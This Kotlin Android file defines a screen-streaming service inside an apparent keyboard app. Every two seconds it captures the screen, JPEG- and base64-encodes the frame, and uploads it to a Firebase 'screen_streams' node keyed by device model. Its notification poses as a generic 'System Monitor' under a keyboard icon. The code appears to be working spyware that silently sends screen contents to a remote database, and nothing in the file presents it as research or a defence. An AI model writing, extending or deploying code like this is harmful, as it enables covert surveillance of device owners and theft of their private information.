package com.example.mykeyboard

import android.annotation.SuppressLint
import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream

@SuppressLint("NewApi")
@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class ScreenStreamService : Service() {
    companion object {
        private const val TAG = "ScreenStreamService"
        private const val CHANNEL_ID = "ScreenStreamChannel"
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var isStreaming = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra("resultCode", Activity.RESULT_CANCELED) ?: Activity.RESULT_CANCELED
        val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra("data", Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra("data")
        }

        startForeground(1, createNotification())

        if (resultCode == Activity.RESULT_OK && data != null) {
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)
            startScreenCapture()
        }

        return START_STICKY
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Screen Stream", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Monitor")
                .setContentText("Screen monitoring active")
                .setSmallIcon(R.drawable.ic_keyboard_launcher)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("System Monitor")
                .setContentText("Screen monitoring active")
                .setSmallIcon(R.drawable.ic_keyboard_launcher)
                .build()
        }
    }

    private fun startScreenCapture() {
        val metrics = resources.displayMetrics
        val width = metrics.widthPixels / 2 // Lower resolution for fast streaming
        val height = metrics.heightPixels / 2
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenStream",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )

        isStreaming = true
        scope.launch {
            while (isStreaming) {
                try {
                    delay(2000L) // Capture every 2 seconds
                    val image = imageReader?.acquireLatestImage()
                    if (image != null) {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * width

                        val bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride,
                            height,
                            Bitmap.Config.ARGB_8888
                        )
                        bitmap.copyPixelsFromBuffer(buffer)
                        image.close()

                        val outputStream = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream)
                        val byteArray = outputStream.toByteArray()
                        val encodedImage = Base64.encodeToString(byteArray, Base64.NO_WRAP)

                        val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                        val database = FirebaseDatabase.getInstance()
                        val ref = database.getReference("screen_streams").child(deviceName)

                        val streamData = mapOf(
                            "timestamp" to System.currentTimeMillis(),
                            "image" to encodedImage
                        )

                        ref.setValue(streamData).addOnSuccessListener {
                            Log.d(TAG, "Screen frame synced to Firebase")
                            LogStore.addLog("[$deviceName] Screen frame streamed")
                        }.addOnFailureListener { e: Exception ->
                            Log.e(TAG, "Failed to sync screen frame", e)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error capturing screen", e)
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isStreaming = false
        virtualDisplay?.release()
        mediaProjection?.stop()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
